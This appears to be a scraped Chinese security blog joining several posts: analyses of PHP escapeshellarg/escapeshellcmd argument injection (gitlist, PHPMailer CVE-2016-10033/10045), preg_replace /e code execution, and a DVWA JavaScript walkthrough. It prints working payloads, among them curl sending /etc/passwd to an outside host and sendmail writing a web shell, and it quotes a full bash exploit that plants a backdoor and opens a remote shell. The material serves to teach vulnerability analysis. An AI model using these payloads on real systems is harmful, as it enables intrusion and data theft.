0.6.0远程命令执行漏洞 gitlist是一款使用PHP开发的图形化git仓库查看工具，在其0.6.0版本中存在一处命令参数注入问题。 当用户对仓库中代码进行搜索时，会调用到git grep命令，如下： 123456789101112&lt;?phppublic function searchTree($query, $branch)&#123; if (empty($query)) &#123; return null; &#125; $query = escapeshellarg($query); try &#123; $results = $this-&gt;getClient()-&gt;run($this, \"grep -i --line-number &#123;$query&#125; $branch\"); &#125; catch (\\RuntimeException $e) &#123; return false; &#125; 关键点在于grep -i --line-number {$query} $branch，这里\\$query是搜索的关键字、由外部参数传入并经过escapeshellarg()过滤，\\$branch是搜索的分支。 但是如果如果用户输入的\\$query的值是–open-files-in-pager=id;时就可以执行id命令，造成命令参数注入漏洞。 escapeshellarg为啥不生效呢？——原因在于该条命令没有限制\\$query只能填在“参数值”的位置，而是可以填在“参数选项”的位置，导致可以注入–open-files-in-pager参数选项来进行命令参数注入，导致RCE。 具体分析参考P神的文章：《谈escapeshellarg绕过与参数注入漏洞》 escapeshellarg&gt;escapeshellcmd参数注入当代码先对输入进行escapeshellarg()处理再进行escapeshellcmd()处理时，则存在参数注入漏洞，具体原理结合下面的Demo来讲解。 先看个Demo理解一下。 看个ls命令参数注入的示例，原本功能是列出tmp目录中除去输入文件名外的所有文件，但是这里我们可以通过参数注入向参数选项注入-l来列出所有详细的文件信息： 1234&lt;?phpsystem(escapeshellcmd(\"ls --ignore=\".escapeshellarg($_GET[c]).\" /tmp\"));//echo escapeshellcmd(\"ls --ignore=\".escapeshellarg($_GET[c]).\" /tmp\");?&gt; 输入payloadalan&#39; -l+，最后的加号表示空格： 怎么形成参数注入的呢？ 我们echo输出看下输入的内容最后是什么形式的： 根据前面escapeshellarg与escapeshellcmd的原理分析一下： 1234567891011121314//初始输入alan&apos; -l+//经过escapeshellarg()处理&apos;alan&apos;\\&apos;&apos; -l+&apos;//拼接命令ls --ignore=&apos;alan&apos;\\&apos;&apos; -l+&apos; /tmp//经过escapeshellcmd()处理，即上图的输出结果ls --ignore=&apos;alan&apos;\\\\&apos;&apos; -l+\\&apos; /tmp//输出结果简化，等同于ls --ignore=alan\\ -l &apos; /tmp 分析可知： 当用户输入包含单引号时，先用escapeshellarg()处理会给该单引号添加转义符，再用escapeshellcmd()处理时会将该添加的转义符再添加一个转义符，从而导致单引号被逃逸掉，从而造成参数注入漏洞的存在； 如果是先用escapeshellcmd()函数过滤，再用escapeshellarg()函数过滤，则不存在参数注入漏洞； tar参数注入tar命令的–use-compress-program参数选项可以执行shell命令，若存在参数注入则可利用。 示例应用escapeshellcmd()过滤，但用户输入的位置可以设置为参数选项，导致参数注入： 1234&lt;?phpsystem(escapeshellcmd('tar '.$_GET[c]));//system('tar '.escapeshellcmd($_GET[c]));?&gt; 输入payload--use-compress-program=&#39;touch /var/www/html/hacked&#39; -cf /tmp/passwd /etc/passwd： find参数注入find命令的-exec参数选项可以执行命令，若存在参数注入则可利用。 原意为在tmp目录查找指定文件，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题： 1234&lt;?phpsystem(escapeshellcmd('find /tmp -iname '.$_GET[c]));//system('find /tmp -iname '.escapeshellcmd($_GET[c]));?&gt; 输入payloadsth -or -exec pwd ; -quit： wget参数注入wget命令的–directory-prefix参数选项可以将目标文件下载到指定目录中，若存在参数注入则可利用。 原意为下载指定Web服务中的文件，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题： 123&lt;?phpsystem(escapeshellcmd(\"wget \".$_GET[c]));?&gt; 输入payload--directory-prefix=/var/www/html http://a.com/exp.php： sendmail参数注入sendmail在前面已经讲过，这里多说一个参数-C File，用File变量指定的备用配置文件启动sendmail命令。 原意为向指定输入邮箱发送mail.txt文件内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题： 123&lt;?system(\"/usr/sbin/sendmail -t -i -f\".escapeshellcmd($_GET[c]).' &lt; mail.txt');?&gt; 除了第一节讲的将shell写到设置在Web目录的日志文件中的利用方法外，还可以进行以下的利用，利用-C参数选项读取任意文件内容。 输入payload`a@b.com -C/etc/passwd -X/tmp/output.txt`： curl参数注入curl命令的-F参数选项为以POST方式提交表单，-T参数选项为上传文件，这些参数选项都存在参数注入风险。 原意为访问指定URL并返回响应报文中body的内容，但是应用escapeshellcmd()的方式不对，不能防止用户输入在参数选项的位置，会导致参数注入问题： 123&lt;?phpsystem(escapeshellcmd(\"curl \".$_GET[c]));?&gt; 示例注入的是-F参数选项，在攻击者服务器编写接收POST方法表单内容的php文件： 123&lt;?phpfile_put_contents('mi1k7ea.txt', file_get_contents($_FILES['filename']['tmp_name']));?&gt; 输入payload-F filename=@/etc/passwd http://a.com/b.php： Bypass技巧——除非ASCII字符如果未设置LANG环境变量，则去除非ASCII字符。 12345678&lt;?phpif(isset($_GET[c]) &amp;&amp; strtolower($_GET[c])!=='system')&#123; //var_dump(escapeshellcmd($_GET[c])); call_user_func(escapeshellcmd($_GET[c]), escapeshellarg($_GET[p]));&#125; else &#123; echo \"Oh no...\";&#125;?&gt; 输入payloadc=systāem&amp;p=whoami，只要包含了非ASCII字符且未设置LANG环境变量，escapeshellarg()就会去除非ASCII字符，来Bypass某些情况： 输出看下Demo就知道了： 123456&lt;?$filename = 'mi1kā7eā.txt';var_dump(escapeshellarg($filename));setlocale(LC_CTYPE, 'en_US.utf8');var_dump(escapeshellarg($filename));?&gt; 0x03 漏洞分析——PHPMailer命令执行漏洞这里以PHPMailer的两个CVE漏洞（CVE-2016-10045和CVE-2016-10033）来逐步分析escapeshellarg和escapeshellcmd的参数注入引起的问题。 CVE-2016-10033环境：https://github.com/opsxcq/exploit-CVE-2016-10033 前提条件： php版本 &lt; 5.2.0； phpmailer版本 &lt; 5.2.18； php未安装pcre； 安全模式未开启即safe_mode = false（default）； 访问页面，是个表单，输入对应的内容即发送邮件： 代码审计看下index.php的代码，关键表单代码如下： 123456789101112131415161718192021222324252627&lt;?phpif (isset($_REQUEST['action']))&#123; $name=$_REQUEST['name']; $email=$_REQUEST['email']; $message=$_REQUEST['message']; if (($name==\"\")||($email==\"\")||($message==\"\"))&#123; echo \"There are missing fields.\"; &#125;else&#123; require 'vulnerable/PHPMailerAutoload.php'; $mail = new PHPMailer; $mail-&gt;Host = \"localhost\"; $mail-&gt;setFrom($email, 'Vulnerable Server'); $mail-&gt;addAddress('admin@vulnerable.com', 'Hacker'); $mail-&gt;Subject = \"Message from $name\"; $mail-&gt;Body = $message; if(!$mail-&gt;send()) &#123; echo 'Message was not sent.'; echo 'Mailer error: ' . $mail-&gt;ErrorInfo; &#125; else &#123; echo 'Message has been sent.'; &#125; &#125;&#125;?&gt; 可以看到，这里是通过新建PHPMailer对象来发送邮件的，其中setFrom、Subject和Body三个参数可控。 下面开始逐步分析漏洞根源，主要看class.papmailer.php文件。 按照index.php中php代码逻辑分析，第一个调用的函数是\\$mail-&gt;setFrom()，用来设置源email地址，看到对应的代码，主要是对输入的\\$address进行相应的处理，去掉空格和换行，判断是否有@、是否含有非8比特的字符、是否之处IDN，再校验邮箱地址是否合法，最后将\\$address赋值给\\$this-&gt;From和\\$this-&gt;Sender： 12345678910111213141516171819202122232425public function setFrom($address, $name = '', $auto = true)&#123; $address = trim($address); $name = trim(preg_replace('/[\\r\\n]+/', '', $name)); //Strip breaks and trim // Don't validate now addresses with IDN. Will be done in send(). if (($pos = strrpos($address, '@')) === false or (!$this-&gt;has8bitChars(substr($address, ++$pos)) or !$this-&gt;idnSupported()) and !$this-&gt;validateAddress($address)) &#123; $error_message = $this-&gt;lang('invalid_address') . \" (setFrom) $address\"; $this-&gt;setError($error_message); $this-&gt;edebug($error_message); if ($this-&gt;exceptions) &#123; throw new phpmailerException($error_message); &#125; return false; &#125; $this-&gt;From = $address; $this-&gt;FromName = $name; if ($auto) &#123; if (empty($this-&gt;Sender)) &#123; $this-&gt;Sender = $address; &#125; &#125; return true;&#125; 我们跟进去validateAddress()函数，看下是怎么处理的。这里\\$patternselect未传进来即值默认为null，然后将\\$validator的值赋给\\$patternselect即为’auto’，进入后面的逻辑开始判断是否有pcre插件，若无pcre则判断php版本是否小于5.2.0，若是则将\\$patternselect重新赋值为’noregex’；而在后面switch语句的noregex逻辑中，是简单地根据@符号来处理输入的邮箱字符串的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445public static function validateAddress($address, $patternselect = null)&#123; if (is_null($patternselect)) &#123; $patternselect = self::$validator; &#125; if (is_callable($patternselect)) &#123; return call_user_func($patternselect, $address); &#125; //Reject line breaks in addresses; it's valid RFC5322, but not RFC5321 if (strpos($address, \"\\n\") !== false or strpos($address, \"\\r\") !== false) &#123; return false; &#125; if (!$patternselect or $patternselect == 'auto') &#123; //Check this constant first so it works when extension_loaded() is disabled by safe mode //Constant was added in PHP 5.2.4 if (defined('PCRE_VERSION')) &#123; //This pattern can get stuck in a recursive loop in PCRE &lt;= 8.0.2 if (version_compare(PCRE_VERSION, '8.0.3') &gt;= 0) &#123; $patternselect = 'pcre8'; &#125; else &#123; $patternselect = 'pcre'; &#125; &#125; elseif (function_exists('extension_loaded') and extension_loaded('pcre')) &#123; //Fall back to older PCRE $patternselect = 'pcre'; &#125; else &#123; //Filter_var appeared in PHP 5.2.0 and does not require the PCRE extension if (version_compare(PHP_VERSION, '5.2.0') &gt;= 0) &#123; $patternselect = 'php'; &#125; else &#123; $patternselect = 'noregex'; &#125; &#125; &#125; switch ($patternselect) &#123; ... case 'noregex': //No PCRE! Do something _very_ approximate! //Check the address is 3 chars or longer and contains an @ that's not the first or last char return (strlen($address) &gt;= 3 and strpos($address, '@') &gt;= 1 and strpos($address, '@') != strlen($address) - 1); ... &#125;&#125; 至此可知，如果满足php版本低于5.2.0且无pcre插件，则我们只需要按照@符的处理进行构造即可。 再回看index.php中的代码，第二个也就是最后一个被调用的函数是\\$mail-&gt;send()，找到对应的代码块，很明显，这里会调用到postSend()函数： 12345678910111213141516public function send()&#123; try &#123; if (!$this-&gt;preSend()) &#123; return false; &#125; return $this-&gt;postSend(); &#125; catch (phpmailerException $exc) &#123; $this-&gt;mailHeader = ''; $this-&gt;setError($exc-&gt;getMessage()); if ($this-&gt;exceptions) &#123; throw $exc; &#125; return false; &#125;&#125; 跟进postSend()函数，这里有个switch语句来匹配\\$this-&gt;Mailer，然而在之前的代码逻辑中被没有对\\$this-&gt;Mailer进行赋值，那么\\$this-&gt;Mailer的值就是初始值mail；可以看到在匹配到mail的代码逻辑中会调用mailSend()函数： 123456789101112131415161718192021222324252627282930313233343536 /** * Which method to use to send mail. * Options: \"mail\", \"sendmail\", or \"smtp\". * @var string */ public $Mailer = 'mail';...public function postSend() &#123; try &#123; // Choose the mailer and send through it switch ($this-&gt;Mailer) &#123; case 'sendmail': case 'qmail': return $this-&gt;sendmailSend($this-&gt;MIMEHeader, $this-&gt;MIMEBody); case 'smtp': return $this-&gt;smtpSend($this-&gt;MIMEHeader, $this-&gt;MIMEBody); case 'mail': return $this-&gt;mailSend($this-&gt;MIMEHeader, $this-&gt;MIMEBody); default: $sendMethod = $this-&gt;Mailer.'Send'; if (method_exists($this, $sendMethod)) &#123; return $this-&gt;$sendMethod($this-&gt;MIMEHeader, $this-&gt;MIMEBody); &#125; return $this-&gt;mailSend($this-&gt;MIMEHeader, $this-&gt;MIMEBody); &#125; &#125; catch (phpmailerException $exc) &#123; $this-&gt;setError($exc-&gt;getMessage()); $this-&gt;edebug($exc-&gt;getMessage()); if ($this-&gt;exceptions) &#123; throw $exc; &#125; &#125; return false; &#125; 跟进mailSend()看看，关注到\\$params，它是由\\$this-&gt;Sender的值直接拼接而成的，最后传入mailPassthru()函数的第五个参数进行调用： 12345678910111213141516171819202122232425262728293031323334protected function mailSend($header, $body)&#123; $toArr = array(); foreach ($this-&gt;to as $toaddr) &#123; $toArr[] = $this-&gt;addrFormat($toaddr); &#125; $to = implode(', ', $toArr); $params = null; //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver if (!empty($this-&gt;Sender)) &#123; $params = sprintf('-f%s', $this-&gt;Sender); &#125; if ($this-&gt;Sender != '' and !ini_get('safe_mode')) &#123; $old_from = ini_get('sendmail_from'); ini_set('sendmail_from', $this-&gt;Sender); &#125; $result = false; if ($this-&gt;SingleTo and count($toArr) &gt; 1) &#123; foreach ($toArr as $toAddr) &#123; $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params); $this-&gt;doCallback($result, array($toAddr), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From); &#125; &#125; else &#123; $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params); $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From); &#125; if (isset($old_from)) &#123; ini_set('sendmail_from', $old_from); &#125; if (!$result) &#123; throw new phpmailerException($this-&gt;lang('instantiate'), self::STOP_CRITICAL); &#125; return true;&#125; 再跟进mailPassthru()函数看下，注意看第五个参数即\\$params的调用过程，当safe_mode安全模式未开启、\\$params不为空、\\$this-&gt;UseSendmailOptions不为空时就将\\$params作为第五个参数传入mail()函数中调用： 12345678910111213141516171819202122232425 /** * Whether mail() uses a fully sendmail-compatible MTA. * One which supports sendmail's \"-oi -f\" options. * @var boolean */ public $UseSendmailOptions = true;...private function mailPassthru($to, $subject, $body, $header, $params) &#123; //Check overloading of mail function to avoid double-encoding if (ini_get('mbstring.func_overload') &amp; 1) &#123; $subject = $this-&gt;secureHeader($subject); &#125; else &#123; $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject)); &#125; //Can't use additional_parameters in safe_mode //@link http://php.net/manual/en/function.mail.php if (ini_get('safe_mode') or !$this-&gt;UseSendmailOptions or is_null($params)) &#123; $result = @mail($to, $subject, $body, $header); &#125; else &#123; $result = @mail($to, $subject, $body, $header, $params); &#125; return $result; &#125; 这里\\$this-&gt;UseSendmailOptions默认初始值为true，且未经过其他赋值操作，因此只要安全模式不开启且\\$params不为空即可进入@mail($to, $subject, $body, $header, $params);的逻辑。 至此，整个调用链我们都分析清楚了。由前面第一节的分析知道，mail()函数的第五个参数可以向sendmail程序添加额外参数来写shell，而这里第五个参数为\\$params，其调用链为：index.php的email表单项–&gt;\\$email–&gt;\\$address–&gt;\\$this-&gt;Sender–&gt;\\$params。 攻击利用因此，我们在email表现进行类似第一小节的参数注入即可写入shell。在email表项填a( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com，在name表项或message表项中填入恶意PHP代码都可： 等待sendmail程序响应一段时间后，访问log-shell.php即可触发恶意PHP代码： 查看日志，确实写入了恶意PHP代码： 当然，有exp脚本直接用就可以了： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/bin/bash# CVE-2016-10033 exploit by opsxcq# https://github.com/opsxcq/exploit-CVE-2016-10033echo '[+] CVE-2016-10033 exploit by opsxcq'if [ -z \"$1\" ]then echo '[-] Please inform an host as parameter' exit -1fiif [ $(uname) == 'Darwin' ]then decoder='base64 -D'elif [ $(uname) == 'Linux' ]then decoder='base64 -d' else echo '[-] Your platform isnt supported: '$(uname) exit -1fihost=$1echo '[+] Exploiting '$hostcurl -sq 'http://'$host -H 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzXJpHSq4mNy35tHe' --data-binary $'------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"action\"\\r\\n\\r\\nsubmit\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"name\"\\r\\n\\r\\n&lt;?php echo \"|\".base64_encode(system(base64_decode($_GET[\"cmd\"]))).\"|\"; ?&gt;\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"email\"\\r\\n\\r\\n\\\"vulnerables\\\\\\\" -OQueueDirectory=/tmp -X/www/backdoor.php server\\\" @test.com\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe\\r\\nContent-Disposition: form-data; name=\"message\"\\r\\n\\r\\nPwned\\r\\n------WebKitFormBoundaryzXJpHSq4mNy35tHe--\\r\\n' &gt;/dev/null &amp;&amp; echo '[+] Target exploited, acessing shell at http://'$host'/backdoor.php'echo '[+] Checking if the backdoor was created on target system'code=$(curl -o /dev/null --silent --head --write-out '%&#123;http_code&#125;\\n' \"http://$host/backdoor.php\")if [ \"$code\" != \"200\" ]then echo '[-] Target cant be exploited' exit -1else echo '[+] Backdoor.php found on remote system'ficmd='whoami'while [ \"$cmd\" != 'exit' ]do echo '[+] Running '$cmd if ! curl -sq http://$host/backdoor.php?cmd=$(echo -ne $cmd | base64) | grep '|' | grep -v 'base64_encode' | head -n 1 | cut -d '|' -f 2 | $decoder then echo '[-] Connection problens' exit -1 fi echo read -p 'RemoteShell&gt; ' cmddoneecho '[+] Exiting' CVE-2016-10045环境：https://github.com/pedro823/cve-2016-10033-45/tree/master/5.2.18 前提条件： php版本 &lt; 5.2.0； phpmailer版本 = 5.2.18； php未安装pcre； 安全模式未开启即safe_mode = false（default）； 界面和功能跟前面的一致： 代码审计和前面一样跟着调用链逐个分析函数，可明显看到官方对mailSend()函数进行了修改： 12345678910111213141516171819202122232425262728293031323334protected function mailSend($header, $body)&#123; $toArr = array(); foreach ($this-&gt;to as $toaddr) &#123; $toArr[] = $this-&gt;addrFormat($toaddr); &#125; $to = implode(', ', $toArr); $params = null; //This sets the SMTP envelope sender which gets turned into a return-path header by the receiver if (!empty($this-&gt;Sender) and $this-&gt;validateAddress($this-&gt;Sender)) &#123; $params = sprintf('-f%s', escapeshellarg($this-&gt;Sender)); &#125; if (!empty($this-&gt;Sender) and !ini_get('safe_mode') and $this-&gt;validateAddress($this-&gt;Sender)) &#123; $old_from = ini_get('sendmail_from'); ini_set('sendmail_from', $this-&gt;Sender); &#125; $result = false; if ($this-&gt;SingleTo and count($toArr) &gt; 1) &#123; foreach ($toArr as $toAddr) &#123; $result = $this-&gt;mailPassthru($toAddr, $this-&gt;Subject, $body, $header, $params); $this-&gt;doCallback($result, array($toAddr), $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From); &#125; &#125; else &#123; $result = $this-&gt;mailPassthru($to, $this-&gt;Subject, $body, $header, $params); $this-&gt;doCallback($result, $this-&gt;to, $this-&gt;cc, $this-&gt;bcc, $this-&gt;Subject, $body, $this-&gt;From); &#125; if (isset($old_from)) &#123; ini_set('sendmail_from', $old_from); &#125; if (!$result) &#123; throw new phpmailerException($this-&gt;lang('instantiate'), self::STOP_CRITICAL); &#125; return true;&#125; 做的修改主要是调用validateAddress()函数对\\$this-&gt;Sender进行过滤，在将\\$this-&gt;Sender拼接赋值给\\$params之前调用escapeshellarg()进行过滤。 这里借个seebug的图对比会更清晰地看出官方修改的地方： 在之前的CVE-2016-10033中的payloada( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com已经用不了了，因为调用了escapeshellarg()进行过滤，但是在其中添加单引号即可Bypass，payload如下： 1a&apos;( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com 为什么添加个单引号就可以Bypass escapeshellarg()的过滤呢？——这里可以参考前面第二节说的escapeshellarg&gt;escapeshellcmd参数注入即可。 这里我们看下mail()函数的源码，可以看到传入的额外参数是会经过escapeshellcmd()函数过滤的，也就是说满足了前面escapeshellarg&gt;escapeshellcmd参数注入的前提条件： 1234567891011if (force_extra_parameters) &#123; extra_cmd = php_escape_shell_cmd(force_extra_parameters);&#125; else if (extra_cmd) &#123; extra_cmd = php_escape_shell_cmd(extra_cmd);&#125;if (php_mail(to_r, subject_r, message, headers_trimmed, extra_cmd TSRMLS_CC)) &#123; RETVAL_TRUE;&#125; else &#123; RETVAL_FALSE;&#125; 攻击利用在email表项处输入payload： 1a&apos;( -OQueueDirectory=/tmp -X/www/log-shell.php )@a.com 在其他项随意一栏输入恶意PHP代码即可。如下： 等一会即可访问后门日志文件： 后台查看： 0x04 题目… 0x05 参考谈escapeshellarg绕过与参数注入漏洞 谈谈escapeshellarg参数绕过和注入的问题 利用/绕过 PHP escapeshellarg/escapeshellcmd函数 PHP escapeshellarg()+escapeshellcmd() 之殇","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"浅析preg_replace与preg_match","date":"2019-07-02T13:53:14.000Z","path":"2019/07/02/浅析preg-replace与preg-match/","text":"这里记录下preg_replace()和preg_match()的一些小坑。 0x01 preg_replace()基本概念preg_replace()函数执行一个正则表达式的搜索和替换。 函数定义 1mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) 搜索subject中匹配pattern的部分，以replacement进行替换。 参数说明 $pattern: 要搜索的模式，可以是字符串或一个字符串数组。 $replacement: 用于替换的字符串或字符串数组。 $subject: 要搜索替换的目标字符串或字符串数组。 $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。 $count: 可选，为替换执行的次数。 返回值 如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。 如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。 PHP代码执行如果在构造正则表达式即pattern参数的时候使用了/e修正符，这时preg_replace()函数就会将replacement参数当作PHP代码执行。 preg_replace()函数实现的PHP代码执行分为三种模式，分别是只可控pattern、replacement、subject这三个参数中其中的一个。 模式一——pattern参数可控12345&lt;?phpecho $re = $_GET['re'];$var = '&lt;h1&gt;phpinfo()&lt;/h1&gt;';preg_replace(\"/&lt;h1&gt;(.*?)$re\", '\\\\1', $var);?&gt; 模式二——replacement参数可控123&lt;?phppreg_replace(\"/com/e\",$_GET['re'],\"www.baidu.com\");?&gt; 模式三——subject参数可控123&lt;?phppreg_replace(\"/\\s*\\[php\\](.*?)\\[\\/php\\]\\s*/ies\", \"\\\\1\", $_GET['re']);?&gt; 这里有个小坑，尝试执行echo ‘mi1k7ea’代码，发现会报错，单引号前被添加转义符转义了： 没关系，换以下几个payload的形式来Bypass即可： 12re=[php]var_dump(`dir`)[/php]re=[php]$&#123;eval($_GET[_])&#125;[/php]&amp;_=phpinfo(); 反向引用这里解释下前面Demo中replacement参数的”\\\\1”指的是什么意思。 对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。 \\\\1中第一个反斜线是转义符号的作用所以它实际上是\\1，作用就是引用临时缓存区中编号为1的储存内容，也就是第一次被捕获的子匹配。 所以，之前Demo中replacement参数的”\\\\1”的意思就是将通过pattern参数匹配到的内容捕获到并赋值给replacement参数。 题目看一道PHP代码审计题目吧： 123456789101112131415&lt;?phpheader(\"Content-Type: text/plain\");function complexStrtolower($regex, $value) &#123; return preg_replace( '/(' . $regex . ')/ei', 'strtolower(\"\\\\1\")', $value );&#125;foreach ($_GET as $regex =&gt; $value) &#123; echo complexStrtolower($regex, $value) . \"\\n\";&#125;?&gt; 代码比较简单，将GET方式传递进来的参数名和参数值分别作为preg_replace()函数的pattern参数的正则部分和subject参数，也就是说preg_replace()函数的第一个参数和第三个参数可控，其中pattern参数含有/e修正符，可以实现PHP代码执行。 下面看下几个坑。 坑1——可变变量 比较下下面两个代码的区别： 12345678910//不会执行phpinfo()&lt;?phppreg_replace('/(.*)/ei', 'strtolower(\"\\\\1\")', 'phpinfo()');?&gt; //会执行phpinfo()&lt;?phppreg_replace('/(.*)/ei', 'strtolower(\"\\\\1\")', '$&#123;phpinfo()&#125;');//&#123;$&#123;phpinfo()&#125;&#125;与$&#123;phpinfo()&#125;一致?&gt; 在前面的模式三Demo中，subject参数为’phpinfo()’即可执行，但这里却不行，因为这里的replacement参数为’strtolower(“\\\\1”)’，即多调用了strtolower()函数、将\\1捕获到的内容转换为了字符串的形式而非代码形式，从而导致无法正常执行。 这里用到可变变量的概念来Bypass。在PHP中变量名是可以动态设置的，看个例子： 1234567&lt;?php$a = \"hello\";$$a = \"world\";echo $$a;echo $hello;//这两个的输出是一样的，输出的都是world，即$$a是先获取$a的值作为变量名，所以$$a=$hello=world?&gt; 但是这样就存在一个歧义的问题，比如说\\$\\$a[1]，解析器需要知道是想要\\$a[1]作为一个变量呢，还是想要$$a作为一个变量并取出该变量中索引为 [1]的值。解决此问题的语法是，对第一种情况用\\${\\$a[1]}，对第二种情况用​\\${\\$a}[1]。 在这个坑中怎么Bypass呢？——将phpinfo()整个看做一个变量名，外面加上\\${}括起来；另一个重要的条件是preg_replace()的replacement参数中是用双引号括起来的即”\\\\1”，因为双引号会解析里面的变量，因此会先解析\\${phpinfo()}里面的内容会变量名，从而执行了phpinfo()。 坑2——GET传递特殊字符会被转换掉 官方给出的payload为：/?.*={${phpinfo()}} 即GET参数名为.*，参数值为{${phpinfo()}}。 直接写进去访问确实没问题，因为(.*)是贪婪模式，会一直匹配符合的内容： 但是一到远程GET传参就GG了： var_dump看下GET传入的参数是啥： 好吧，’.’被转换成了’_‘，这是因为在PHP中，对于传入的非法的\\$_GET数组参数名，会将其转换成下划线，这就导致我们正则匹配失效。我们可以fuzz一下PHP会将哪些符号替换成下划线，这里借用大佬博客的图： Exp 既然(.*)这种贪婪模式无法正常传递过去，那就换其他的payload就OK了： 12\\S*=$&#123;phpinfo()&#125;\\$&#123;\\w*\\(\\)&#125;=$&#123;phpinfo()&#125; 0x02 preg_match()基本概念preg_match — 执行匹配正则表达式 函数定义如下： 1preg_match ( string pattern , string matches [, int flags = 0 [, int $offset = 0 ]]] ) : int 搜索subject与pattern给定的正则表达式的一个匹配。 preg_match()并不会执行PHP代码，但是它在一些CTF题目这种出现过，看道题目吧。 题目可参考：https://ctf-wiki.github.io/ctf-wiki/web/php/php-zh/#preg_match 0x03 参考PHP代码审计-preg_replace函数命令执行 深入研究preg_replace与代码执行","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"DVWA之JavaScript攻击","date":"2019-07-02T12:21:28.000Z","path":"2019/07/02/DVWA之JavaScript攻击/","text":"JavaScript攻击属于Web前端安全，不存在黑盒测试的概念，直接可以对JS进行白盒代码审计。 DVWA中的JavaScript攻击的场景是基于token由前端JS生成而引起的一系列问题。 0x01 Low Level页面如下，要求输入success来达到目的： 直接输入success提交，会显示invalid token： 查看页面源代码，看到是调用generate_token()函数，其中的token值是由md5(rot13(phrase))得到的，并且表单中存在一项隐藏的表项token： 可以看到，token是通过JS在客户端生成。而题目的意思应该就是让token的值和phrase经过某些加密操作后的值相等即可。 那就简单了，先在Console直接得到正确的token值： 在前端直接篡改token的值即可： 再输入success，OK： 最后，我们看下index.php源码，确认确实是通过比较加密phrase后的值与token的值是否相等来看是否JS攻击成功： 123456789101112131415161718192021222324252627282930if ($phrase == \"success\") &#123; switch( $_COOKIE[ 'security' ] ) &#123; case 'low': if ($token == md5(str_rot13(\"success\"))) &#123; $message = \"&lt;p style='color:red'&gt;Well done!&lt;/p&gt;\"; &#125; else &#123; $message = \"&lt;p&gt;Invalid token.&lt;/p&gt;\"; &#125; break; case 'medium': if ($token == strrev(\"XXsuccessXX\")) &#123; $message = \"&lt;p style='color:red'&gt;Well done!&lt;/p&gt;\"; &#125; else &#123; $message = \"&lt;p&gt;Invalid token.&lt;/p&gt;\"; &#125; break; case 'high': if ($token == hash(\"sha256\", hash(\"sha256\", \"XX\" . strrev(\"success\")) . \"ZZ\")) &#123; $message = \"&lt;p style='color:red'&gt;Well done!&lt;/p&gt;\"; &#125; else &#123; $message = \"&lt;p&gt;Invalid token.&lt;/p&gt;\"; &#125; break; default: $vulnerabilityFile = 'impossible.php'; break; &#125; &#125; else &#123; $message = \"&lt;p&gt;You got the phrase wrong.&lt;/p&gt;\"; &#125; 0x02 Medium Level和前面类似，只是换了JS代码，在表单处单独调用JS文件： 访问该JS文件： 12345678910function do_something(e)&#123; for(var t=\"\",n=e.length-1;n&gt;=0;n--)t+=e[n]; return t&#125;setTimeout(function()&#123;do_elsesomething(\"XX\")&#125;,300);function do_elsesomething(e)&#123; document.getElementById(\"token\").value=do_something(e+document.getElementById(\"phrase\").value+\"XX\")&#125; 代码逻辑在调用setTimeout()，setTimeout()方法用于在指定的毫秒数后调用函数或计算表达式。这里调用do_elsesomething()函数，而do_elsesomething()函数中有生成token的代码，其中将传入参数e、前端表单输入的phrase值以及”XX”字符串进行拼接再调用do_something()函数进行字符串翻转处理。 那就这样吧： 改下JS即可： 0x03 High Level再看下high的，调用了high.js： 查看high.js，发现不是人看的代码： 这是因为做了混淆，访问解码网站来转换成人民群众可看懂的形式，下面只列出关键的代码，前面省略的部分是算法部分： 1234567891011121314151617181920...function do_something(e) &#123; for (var t = \"\", n = e.length - 1; n &gt;= 0; n--) t += e[n]; return t&#125;function token_part_3(t, y = \"ZZ\") &#123; document.getElementById(\"token\").value = sha256(document.getElementById(\"token\").value + y)&#125;function token_part_2(e = \"YY\") &#123; document.getElementById(\"token\").value = sha256(e + document.getElementById(\"token\").value)&#125;function token_part_1(a, b) &#123; document.getElementById(\"token\").value = do_something(document.getElementById(\"phrase\").value)&#125;document.getElementById(\"phrase\").value = \"\";setTimeout(function() &#123; token_part_2(\"XX\")&#125;, 